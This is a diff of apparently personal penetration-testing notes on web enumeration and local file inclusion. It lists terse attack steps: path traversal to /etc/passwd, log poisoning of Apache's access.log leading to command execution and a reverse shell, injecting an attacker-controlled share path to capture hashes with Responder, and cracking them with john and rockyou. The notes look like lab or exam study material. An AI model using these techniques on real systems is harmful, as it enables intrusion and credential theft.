@@ -8,7 +8,8 @@
 5. If you find some directory and stuck  make sure to run gobuster again with the new directory i.e http:\\$IP/newDirectory  
 6.
 
-##Possible web vulnerabilities
+#Possible web vulnerabilities
+## LFI
 1. LocalFile Inclusion: We can log poision if linux based or try remote access control if Window
 2. Check links ending with ?file=index.php ?book=  (Possible vulnerabilities in source code)
 3. book= ../../../../etc/passwd   (Hosting on **Window or apache )
@@ -20,7 +21,8 @@
 9. Connect to nc -nv $IP port. and insert commandline exeuction payload (This depends on what techonology it is using. php ..etc)
 10. check for sucessful log poisioning ../../../../var/log/apache2/access.log&cmd=i.
 11. If you receive command execution, we will insert a reversshell via url encoding. Done.
-12. Use responder to capture. sudo python3 Responder.py -I tun0. inject file=//$IP/testShare in the url. Use john the ripper to match hash.
+12. Use responder to capture. sudo python3 Responder.py -I tun0. inject file=//$MyIP/testShare in the url. Use john the ripper to match hash. 
+13. john -w=/usr/share/wordlists/rockyou.txt hash.txt
  
 
 ##Login page
